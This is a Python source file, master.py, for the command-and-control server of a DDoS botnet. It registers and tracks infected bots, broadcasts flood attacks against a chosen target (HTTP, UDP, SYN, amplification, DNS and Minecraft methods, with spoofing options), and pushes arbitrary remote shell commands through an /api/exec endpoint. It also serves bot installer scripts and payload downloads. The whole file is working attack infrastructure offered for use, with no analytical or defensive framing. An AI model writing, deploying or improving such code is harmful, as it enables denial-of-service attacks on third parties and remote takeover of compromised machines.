#!/usr/bin/env python3
"""
master.py - control server + static dashboard host.
    pip install -r requirements.txt
    TOKEN=secret python master.py
"""
import asyncio, os, time
from aiohttp import web

TOKEN     = os.environ.get("TOKEN", "")
PORT      = int(os.environ.get("PORT", "10000"))
HOLD_IDLE = float(os.environ.get("HOLD_IDLE", "25"))
HOLD_BUSY = float(os.environ.get("HOLD_BUSY", "8"))
STALE     = float(os.environ.get("STALE", "45"))
HERE      = os.path.dirname(os.path.abspath(__file__))
UIFILE    = os.path.join(HERE, "ui", "index.html")

METHODS = {"http", "httpk", "udp", "tcp", "mc", "mcjoin", "mcpe",
           "slow", "syn", "amp", "dns", "pps", "rawudp"}

BOTS, TASKS, HISTORY = {}, {}, []
JOB, JOB_ID = None, 0
EVENT = asyncio.Event()
T0 = time.time()


def auth(r):
    return (not TOKEN) or r.query.get("k") == TOKEN or r.headers.get("X-Token") == TOKEN


def qint(q, key, default, lo=None, hi=None):
    try:
        v = int(float(q.get(key, default)))
    except (TypeError, ValueError):
        v = default
    if lo is not None:
        v = max(lo, v)
    if hi is not None:
        v = min(hi, v)
    return v


def archive(job, why):
    if job and job.get("op") == "attack":
        h = dict(job)
        h["ended"] = time.time()
        h["why"] = why
        HISTORY.insert(0, h)
        del HISTORY[30:]


# ------------------------------------------------------------------ agent side
async def wait_change(since, hold):
    end = time.time() + hold
    while JOB_ID == since:
        left = end - time.time()
        if left <= 0:
            break
        try:
            await asyncio.wait_for(EVENT.wait(), left)
        except asyncio.TimeoutError:
            break
        EVENT.clear()


async def poll(request):
    try:
        d = await request.json()
    except Exception:
        d = {}
    bid = str(d.pop("id", "?"))
    b = BOTS.setdefault(bid, {})
    b.update(d)
    b["seen"] = time.time()
    b["ip"] = (request.headers.get("X-Forwarded-For", "").split(",")[0].strip()
               or request.remote or "")
    busy = JOB is not None and JOB.get("until", 0) > time.time()
    hold = HOLD_BUSY if busy else HOLD_IDLE
    if int(d.get("v") or 0) == JOB_ID:
        await wait_change(JOB_ID, hold)
    tasks, TASKS[bid] = TASKS.get(bid, []), []
    return web.json_response({"v": JOB_ID, "job": JOB, "tasks": tasks,
                              "hold": hold, "now": time.time()})


# ------------------------------------------------------------------ dashboard api
async def api_state(request):
    now = time.time()
    online = attacking = 0
    pps = mb = 0.0
    rows = []
    for bid, b in BOTS.items():
        age = now - b.get("seen", 0)
        live = age < STALE
        if live:
            online += 1
            if b.get("state") == "attack":
                attacking += 1
                pps += b.get("pps", 0) or 0
                mb += b.get("mbps", 0) or 0
        rows.append({
            "id": bid, "host": b.get("host", ""), "os": b.get("os", ""),
            "arch": b.get("arch", ""), "ip": b.get("ip", ""),
            "state": "dead" if not live else (b.get("state") or "idle"),
            "pps": round(b.get("pps", 0) or 0), "mbps": round(b.get("mbps", 0) or 0, 2),
            "cpu": b.get("cpu", 0), "perm": b.get("perm", 0),
            "up": b.get("up", 0), "ver": b.get("ver", ""), "age": round(age),
            "target": b.get("target", ""), "method": b.get("method", ""),
        })
    rows.sort(key=lambda r: (r["state"] == "dead", r["state"] != "attack", r["age"]))
    return web.json_response({
        "online": online, "attacking": attacking, "total": len(BOTS),
        "pps": pps, "mbps": mb, "uptime": round(now - T0), "now": now,
        "job": JOB, "history": HISTORY[:20], "bots": rows[:1500],
        "truncated": max(0, len(rows) - 1500),
    })


async def api_fire(request):
    global JOB, JOB_ID
    if not auth(request):
        return web.json_response({"e": "auth"}, status=401)
    q = request.query
    if not q.get("target"):
        return web.json_response({"e": "no target"}, status=400)
    method = q.get("method", "http")
    if method not in METHODS:
        return web.json_response({"e": "bad method: " + method,
                                  "valid": sorted(METHODS)}, status=400)
    now = time.time()
    dur = qint(q, "dur", 60, 1, 86400)
    archive(JOB, "replaced")
    JOB = {
        "op": "attack", "id": int(now * 1000),
        "method": method, "target": q.get("target", ""),
        "port": qint(q, "port", 80, 1, 65535), "dur": dur,
        "threads": qint(q, "threads", 32, 1, 2048),
        "procs": qint(q, "procs", 1, 1, 32),
        "size": qint(q, "size", 1024, 16, 65507),
        "start": now + 4, "until": now + 4 + dur,
    }
    for k in ("pipeline", "hold", "drain", "tls", "spoof", "real_ip"):
        if q.get(k) is not None:
            JOB[k] = q.get(k)
    JOB_ID += 1
    EVENT.set()
    return web.json_response({"ok": True, "v": JOB_ID, "bots": len(BOTS)})


async def api_stop(request):
    global JOB, JOB_ID
    if not auth(request):
        return web.json_response({"e": "auth"}, status=401)
    archive(JOB, "stopped")
    JOB = {"op": "stop", "until": time.time() + 3600, "id": int(time.time() * 1000)}
    JOB_ID += 1
    EVENT.set()
    return web.json_response({"ok": True, "v": JOB_ID})


async def push(request, task):
    if not auth(request):
        return web.json_response({"e": "auth"}, status=401)
    one = request.query.get("id")
    ids = [one] if one and one in BOTS else list(BOTS)
    for b in ids:
        TASKS.setdefault(b, []).append(task)
    EVENT.set()
    return web.json_response({"ok": True, "pushed": len(ids)})


async def api_kick(request):
    if not auth(request):
        return web.json_response({"e": "auth"}, status=401)
    bid = request.query.get("id", "")
    BOTS.pop(bid, None)
    TASKS.pop(bid, None)
    return web.json_response({"ok": True})


# ------------------------------------------------------------------ static
async def page(request):
    if not os.path.exists(UIFILE):
        return web.Response(text="ui/index.html missing", status=404)
    return web.FileResponse(UIFILE)


async def dl(request):
    name = os.path.basename(request.match_info["name"])
    for p in (os.path.join(HERE, "dl", name), os.path.join(HERE, name)):
        if os.path.exists(p):
            return web.FileResponse(p)
    return web.Response(status=404, text="not found")


async def script(request):
    name = os.path.basename(request.path)          # <-- FIX: was match_info["name"]
    p = os.path.join(HERE, name)
    if not os.path.exists(p):
        return web.Response(status=404, text=name + " missing")
    body = open(p, "rb").read().replace(b"__MASTER__", str(request.url.origin()).encode())
    return web.Response(body=body, content_type="text/plain")


async def pruner():
    while True:
        await asyncio.sleep(60)
        now = time.time()
        for k in [k for k, v in BOTS.items() if now - v.get("seen", 0) > 3600]:
            BOTS.pop(k, None)
            TASKS.pop(k, None)


def make_app():
    app = web.Application(client_max_size=1 << 20)
    app.router.add_post("/poll", poll)
    app.router.add_get("/api/state", api_state)
    app.router.add_get("/api/fire", api_fire)
    app.router.add_get("/api/stop", api_stop)
    app.router.add_get("/api/update", lambda r: push(r, {"op": "update"}))
    app.router.add_get("/api/restart", lambda r: push(r, {"op": "restart"}))
    app.router.add_get("/api/exec", lambda r: push(
        r, {"op": "exec", "cmd": r.query.get("cmd", ""), "rid": str(time.time())}))
    app.router.add_get("/api/kick", api_kick)
    app.router.add_get("/ping", lambda r: web.Response(text="ok"))
    app.router.add_get("/dl/{name}", dl)
    app.router.add_get("/i.ps1", script)
    app.router.add_get("/i.sh", script)
    app.router.add_get("/", page)
    app.router.add_get("/ui", page)
    return app


if __name__ == "__main__":
    app = make_app()
    app.on_startup.append(lambda a: asyncio.create_task(pruner()))
    web.run_app(app, host="0.0.0.0", port=PORT, access_log=None,
                backlog=2048, handler_cancellation=True)
